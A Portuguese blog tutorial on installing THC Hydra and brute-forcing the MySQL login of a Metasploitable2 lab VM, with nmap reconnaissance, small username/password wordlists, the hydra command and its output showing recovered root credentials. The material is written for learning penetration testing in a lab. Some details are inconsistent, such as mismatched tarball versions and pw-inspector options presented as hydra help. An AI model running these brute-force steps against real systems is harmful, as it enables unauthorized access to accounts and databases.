---
title: Quebrando senhas com o THC Hydra
date:   2017-08-15 21:25:41
description: Realizando testes com o THC Hydra, para quebrar senhas usando o método de BruteForce.
categories:
- Security
tags: [Security, Scripts]
image:
   url: img\posts\2017-08-15-quebrando-senhas-com-o-thc-hydra\header.jpg
---

## THC Hydra

Vou falar hoje sobre uma ferramenta que também é muito utilizada para realização de auditoriais em pentest que é o `THC – Hydra` que tem como objetivo realizar ataques de `força bruta` ou como muitos falam `brute force`, ou seja, ele faz diversas tentativas de acesso com a utilização de `wordlist`, até conseguir acesso.


![imagem hydra](img/posts/2017-08-15-quebrando-senhas-com-o-thc-hydra/xhydra.png)



## O que o THC Hydra suporta

Atualmente o `THC – Hydra`, suporta os serviços:

AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET,
HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET,
HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP,
MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere,
PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP,
SMTP Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2),
Telnet, VMware-Auth, VNC and XMPP.

## Instalando o Hydra no Linux

Para quem usa Kali Linux, ele ejá vem instalado, mas para quem usar outras distribuições assim como eu, é só seguir os passos abaixo:

Primeiro será necessário baixar os arquivos e descompactá-los.

{% highlight bash %}
wget www.thc.org/releases/hydra-8.1.tar.gz
tar vzxf hydra-7.1-src.tar.gz
cd hydra-8.1
{% endhighlight %}

#### Configurações opcionais

{% highlight bash %}
--disable-xhydra # não compila o xhydra (hydra GUI)
--prefix=/opt/hydra # diz onde vai ser instalado o hydra.
{% endhighlight %}

{% highlight bash %}
./configure --disable-xhydra --prefix=/opt/hydra
{% endhighlight %}

compila, instala e cria link simbólico:

{% highlight bash %}
make && make install && ln -s /opt/hydra/hydra /usr/bin
{% endhighlight %}

Caso queira usar o pw-inspector criar um link simbólico pra ele também:

{% highlight bash %}
ln -s /opt/hydra/pw-inspector /usr/bin
{% endhighlight %}


## Metasploitable2 e reconhecimento

Para que possamos realizar o teste nesse artigo, vou utilizar uma máquina virtual que tem diversas vulnerabilidades justamente para realizar testes de invasão, [Metasploitable2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/){:class='link-exteno'}, caso queria saber mais sobre essa máquina virtual, é só [acessar o seu WIKI](https://sourceforge.net/p/metasploitable/wiki/Home/){:class='link-exteno'}.

A instalação dessa máquina virtual não é difícil, você só precisa de um software de virtualização, eu uso o `Virtual Box`, que a sua licença é `free`. Existe esse [Tutorial AQUI](http://resources.infosecinstitute.com/running-metasploitable2-on-virtualbox/){:class='link-exteno'}, que explica como usar o `Metasploitable2` no virtual box, se você seguir o tutorial certinho, nada vai dar errado.

### Usando Nmap para reconhecimento

Após a instalação dessa minha máquina virtual, será necessário descobrir quais os serviços que estão abertos nela para que possamos pegar um que esteja com o status de `open`, então para isso vou utilizar o `nmap`, vou filtrar somente algumas portas.

{% highlight bash %}
nmap -sS 192.168.1.40 -p [80,22,3306]
{% endhighlight %}

Lembrando o IP `192.168.1.40` é minha máquina virtual. Resultado:

{% highlight bash %}
Nmap scan report for new-host.home (192.168.1.40)
Host is up (0.00057s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 08:00:27:40:36:A7 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 1.58 second
{% endhighlight%}

Perfeito sabemos que os serviços de `SSH, HTTP e MYSQL`, estão com o status de open, vou tentar quebrar a senha do `mysql`.

## Entendendo como o Hydra funciona

Já que descobrimos que o serviço de `mysql` está com o status de open, vamos descobrir qual o usuário e a senha do mysql, para que possamos fazer vamos utilizar o hydra.

Antes de realizarmos qualquer teste, vamos dar uma olhada no help então execute aí `hydra -help`.

{% highlight bash %}
  -i FILE nome da wordlist pra ser tratada (default: stdin).
  -o FILE nome para o arquivo saída com o conteúdo já tratado (default: stdout).
  -m Tamanho minimo da senha.
  -M Tamanho máximo da senha.
  -c MINISETS número minimo de sets necessários.

Sets:
     -l Caracteres minúsculos (a,b,c,d, etc.)
     -u Caracteres maiúsculos (A,B,C,D, etc.)
     -n Números  (1,2,3,4, etc.)
     -p Aqui são os caracteres que não se encaixam -l/-u/-n em são eles $,!,/,(,, etc.)
     -s Caracteres especiais - são todos que não encaixam em nenhum dos sets acima.
     -t Limita o número de conexões paralelas (default: 16).
{% endhighlight %}

Essas são as opções que vamos utilizar aqui, existem outras, caso fique curioso é só ler o restante das opções, o help todo está em inglês essa é uma tradução feila pelo `MDH3LL`.

### Wordlists

Após conhecermos as opções que vamos utilizar então é só partimos para ação. Primeiro precisamos de uma `wordlist`, então vamos fazer uma, não precisa ser algo muito complexo vamos criar uma com poucas informações mesmo, é claro que se você tiver uma com mais opções e maior será bem mais eficiente, mas se não tiver então acesse o seu terminal e digite:

{% highlight bash %}
touch user.list
vim user.list
{% endhighlight %}

Aperte a tecla `i` copie e cole os users abaixo:

{% highlight bash %}
root
teste
admin
user
ROOT
RooT
User
Admin
{% endhighlight%}

Aperte `esc` e digite `:wq`

para fazer a `wordlist` de senhas:

{% highlight bash %}
touch password.list
vim password.list
{% endhighlight %}

Copie e cole as mesmas informações da lista `user`. Com as wordlist prontas agora vamos tentar quebrar a senha do mysql `Lol`. Para isso acesse o seu terminal e digite:

### Quebrando senhas com o THC Hydra.

{% highlight bash %}
hydra -L user.list -P password.list -t 1 192.168.1.40 mysql
{% endhighlight %}

Resultado:
{% highlight bash %}
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-04-21 13:31:16
[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
[DATA] max 1 task per 1 server, overall 64 tasks, 28472 login tries (l:8/p:3559), ~444 tries per task
[DATA] attacking service mysql on port 3306
[3306][mysql] host: 192.168.1.40   login: "root"  - pass "" - 35 of 3559 [child 0]
{% endhighlight %}

Como é possível ver no nosso resultado temos acesso ao `mysql` o usuário `root` e com nenhuma senha. Então vamos alterar a senha do `mysql` para uma palavra que colocamos na nossa wordlist, aqui vou usar a senha `admin`. Para alterar a senha do mysql vá ate a sua máquina virtual e digite:

{% highlight bash %}
mysqladmin -u root password 'admin'
{% endhighlight %}

Se realizarmos o teste novamente

{% highlight bash %}
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-04-21 13:55:27
[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
[DATA] max 1 task per 1 server, overall 64 tasks, 28472 login tries (l:8/p:3559), ~444 tries per task
[DATA] attacking service mysql on port 3306
[3306][mysql] host: 192.168.1.40   login: "root"  - pass "admin" - 35 of 3559 [child 0]
{% endhighlight %}

Bom à principio é apenas isso, você também pode fazer testes como esses em páginas de login, é só uma questão de ler com atenção as opções que exitem no help, com certeza você vai conseguir fazer outros testes bem mais interessantes que esse.

### Referências

[THC-HYDRA [PT-BR] ver 2.1 (Rev)](https://ghostbin.com/paste/y92ha){:class='link-exteno'}

[thc.org](https://www.thc.org/thc-hydra/){:class='link-exteno'}


-----
Viu algum erro ou gostaria de adicionar alguma sugestão a essa matéria? Comente.